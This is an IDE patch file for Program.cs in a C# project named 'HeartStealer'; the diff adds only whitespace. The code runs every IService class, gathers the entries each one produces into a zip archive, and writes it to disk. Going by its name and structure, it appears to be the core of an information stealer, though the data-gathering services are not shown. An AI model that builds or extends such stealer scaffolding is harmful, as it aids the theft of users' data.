@@ -1,0 +1,25 @@
+Index: HeartStealer/Program.cs
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>/*\r\n    Heart Stealer\r\n*/\r\n\r\nusing System;\r\nusing System.IO;\r\nusing HeartStealer.Extensions;\r\nusing HeartStealer.Services;\r\n\r\nnamespace HeartStealer\r\n{\r\n    internal static class Program\r\n    {\r\n        public static void Main()\r\n        {\r\n            var ms = new MemoryStream();\r\n            using (var zip = ZipStorage.Create(ms))\r\n            {\r\n                RuntimeResolver.GetInheritedClasses<IService>().ForEach(s =>\r\n                {\r\n                    s.Run();\r\n                    foreach (var record in s.Entries)\r\n                    {\r\n                        zip.AddStream(ZipStorage.Compression.Deflate,\r\n                            record.Path,\r\n                            new MemoryStream(record.Content),\r\n                            DateTime.Now);\r\n                    }\r\n                    s.Dispose();\r\n                });\r\n            }\r\n            File.WriteAllBytes(\"test.zip\", ms.ToArray());\r\n        }\r\n    }\r\n}
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/HeartStealer/Program.cs b/HeartStealer/Program.cs
+--- a/HeartStealer/Program.cs	(revision 218d1c53a63fa71f73d4429ba1294e8959b144ee)
++++ b/HeartStealer/Program.cs	(date 1688040809876)
+@@ -26,10 +26,13 @@
+                             new MemoryStream(record.Content),
+                             DateTime.Now);
+                     }
++
+                     s.Dispose();
+                 });
+             }
++
+             File.WriteAllBytes("test.zip", ms.ToArray());
++
+         }
+     }
+ }
+\ No newline at end of file
